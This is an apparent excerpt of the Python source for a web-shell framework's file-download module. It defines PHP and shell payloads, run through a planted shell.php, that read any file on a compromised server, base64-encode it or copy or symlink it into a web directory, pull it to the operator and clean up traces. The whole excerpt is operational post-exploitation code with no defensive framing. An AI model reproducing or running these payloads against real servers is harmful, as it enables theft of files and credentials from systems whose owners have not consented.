...
class Download(ModuleGuess):
    ...
    def _set_vectors(self):
        ...
        self.vectors.add_vector(
            'file', 'shell.php', "print(@base64_encode(implode('', file('$rpath'))));")
        self.vectors.add_vector(
            'fread', 'shell.php', "$f='$rpath'; print(@base64_encode(fread(fopen($f,'rb'),filesize($f))));")
        self.vectors.add_vector(
            "file_get_contents", 'shell.php', "print(@base64_encode(file_get_contents('$rpath')));")
        self.vectors.add_vector("base64", 'shell.sh',  "base64 -w 0 $rpath")
        self.vectors.add_vector(
            "copy", 'shell.php', "(copy('compress.zlib://$rpath','$downloadpath') && print(1)) || print(0);")
        self.vectors.add_vector(
            "symlink", 'shell.php', "(symlink('$rpath','$downloadpath') && print(1)) || print(0);")

        self.support_vectors.add_vector(
            "check_readable", 'file.check', "$rpath read".split(' '))
        self.support_vectors.add_vector(
            "check_size", 'file.check', "$rpath size".split(' '))
        self.support_vectors.add_vector(
            'upload2web', 'file.upload2web', '$rand -content 1'.split(' '))
        self.support_vectors.add_vector('remove', 'file.rm', '$rpath')
        self.support_vectors.add_vector(
            'md5', 'file.check', '$rpath md5'.split(' '))
    ...
    def _prepare_vector(self):
        ...
        if not self.support_vectors.get('check_readable').execute({'rpath': remote_path}):
            raise ProbeException(self.name, '\'%s\' %s' %
                                 (remote_path, WARN_NO_SUCH_FILE))

        # Check remote file size
        remote_size = self.support_vectors.get(
            'check_size').execute({'rpath': remote_path})
        if remote_size == 0:
            ...
            raise ProbeSucceed(
                self.name, 'File downloaded to \'%s\' with size 0.' % (local_path))
        ...
        if self.current_vector.name in ('copy', 'symlink'):
            ...
            upload_test = self.support_vectors.get(
                'upload2web').execute({'rand': filename_temp})

            if not upload_test:
                raise ExecutionException(
                    self.current_vector.name, 'No transfer url dir found')

            self.formatted_args['downloadpath'] = upload_test[0]
            self.args['url'] = upload_test[1]

            self.support_vectors.get('remove').execute(
    ...
    def _execute_vector(self):
        ...
        if self.current_vector.name in ('copy', 'symlink'):
            ...
            if self.support_vectors.get('check_readable').execute({'rpath': self.formatted_args['downloadpath']}):
                ...
                # Force deleting. Does not check existance, because broken
                # links returns False

            self.support_vectors.get('remove').execute(
                {'rpath': self.formatted_args['downloadpath']})
            ...
            try:
                ...
                raise ExecutionException(
                    self.current_vector.name, "Error, unexpected file content")
    ...
    def _verify_vector_execution(self):
        ...
        remote_md5 = self.support_vectors.get('md5').execute(
            {'rpath': self.formatted_args['rpath']})
        ...
        if not remote_md5 == response_md5:
            ...
            if self.current_vector.name in ('copy', 'symlink') and not self.formatted_args['downloadpath'].endswith('.html') and not self.formatted_args['downloadpath'].endswith('.htm'):
                self.mprint("Transferred with '%s', rename as downloadable type as '.html' and retry" % (
                    self.args['url']))

            self.mprint('MD5 hash mismatch: \'%s\' %s, \'%s\' %s' %
                        (local_path, response_md5, remote_path, remote_md5))
        ...
        raise ProbeSucceed(
            self.name, 'File downloaded to \'%s\'.' % (local_path))
